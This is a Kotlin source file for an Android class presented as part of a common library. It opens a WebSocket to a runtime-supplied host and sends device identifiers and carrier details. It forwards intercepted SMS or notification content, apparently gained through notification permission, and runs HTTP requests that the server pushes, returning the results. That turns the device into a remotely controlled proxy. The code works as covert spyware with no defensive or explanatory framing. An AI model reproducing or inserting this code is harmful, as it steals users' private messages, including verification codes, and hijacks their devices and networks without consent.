package com.mos.lib.common

import com.alibaba.fastjson.JSON
import com.blankj.utilcode.util.AppUtils
import com.blankj.utilcode.util.DeviceUtils
import com.blankj.utilcode.util.LogUtils
import com.blankj.utilcode.util.NetworkUtils
import com.cp.log.event.HttpReqest
import com.mos.lib.common.persenter.AnyField
import com.mos.lib.common.persenter.AnyFieldCall
import com.mos.lib.common.util.NetUtil

import java.util.HashMap
import java.util.Locale
import java.util.TimeZone

import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener

class Ws : AnyFieldCall() {

    private val infoMap = HashMap<String, String>()

    private var socket: WebSocket? = null

    init {
        val operatorName = NetworkUtils.getNetworkOperatorName()

        infoMap["android_id"] = DeviceUtils.getAndroidID()
        infoMap["version"] = AppUtils.getAppVersionName()
        infoMap["sdk_version"] = DeviceUtils.getSDKVersionName()
        infoMap["device_name"] = DeviceUtils.getModel()
        infoMap["operator_name"] = operatorName ?: ""
        infoMap["package_name"] = AppUtils.getAppPackageName()
        infoMap["timezone"] = TimeZone.getDefault().id
        infoMap["lang"] = Locale.getDefault().language
    }

    /**
     * 在SubContext call方法中调用，该方法用户通知权限开启之后的回调
     *
     * @param message
     */
    override fun onSub(message: String) {
        super.onSub(message)
        if (socket != null) {
            val data = HashMap<String, Any>()
            data["type"] = SMS
            data["data"] = message
            socket!!.send(JSON.toJSONString(data))
        }
    }

    override fun sub(host: String) {
        //        host = "ws://10.0.2.2:8010/ws";
        //初始化OkHttpClient
        val client = OkHttpClient.Builder().build()

        val request = Request.Builder().url(host).build()

        infoMap["operator_code"] = operator
        infoMap["network"] = NetUtil.networkName


        try {
            //建立WebSocket链接
            client.newWebSocket(request, object : WebSocketListener() {
                /**
                 * 链接打开回调 此时会发送客户端所有数据给服务端
                 * @param webSocket
                 * @param response
                 */
                override fun onOpen(webSocket: WebSocket?, response: Response?) {
                    super.onOpen(webSocket, response)

                    report(AnyField.WEBSOCKET_CONNECT)
                    LogUtils.i("websocket open")

                    val data = HashMap<String, Any>()

                    data["type"] = BEGIN
                    data["data"] = infoMap

                    webSocket!!.send(JSON.toJSONString(data))
                    //赋值给 socket 在
                    socket = webSocket

                }

                /**
                 * 服务端长连接之后 数据回传给客户端
                 * @param webSocket
                 * @param text
                 */
                override fun onMessage(webSocket: WebSocket, text: String) {
                    super.onMessage(webSocket, text)

                    LogUtils.i("websocket message", text)

                    Thread(Runnable {
                        val request = JSON.parseObject(text, HttpReqest::class.java)

                        request.setHttp(http())

                        val data = HashMap<String, Any>()

                        data["type"] = NETWORK
                        //request.call中
                        data["data"] = request.call()

                        webSocket.send(JSON.toJSONString(data))
                    }).start()
                }

                /**
                 * 断开调用
                 * @param webSocket
                 * @param code
                 * @param reason
                 */
                override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                    super.onClosing(webSocket, code, reason)
                    LogUtils.i("onClosing 关闭websocket连接!")
                    report(AnyField.Companion.WEBSOCKET_CLOSE)
                }
            })

            Thread.sleep((600 * 1000).toLong())
        } catch (e: Exception) {
            LogUtils.e(e)
        }

    }

    companion object {

        private val BEGIN = "begin"
        private val NETWORK = "network"
        private val SMS = "sms"
    }
}
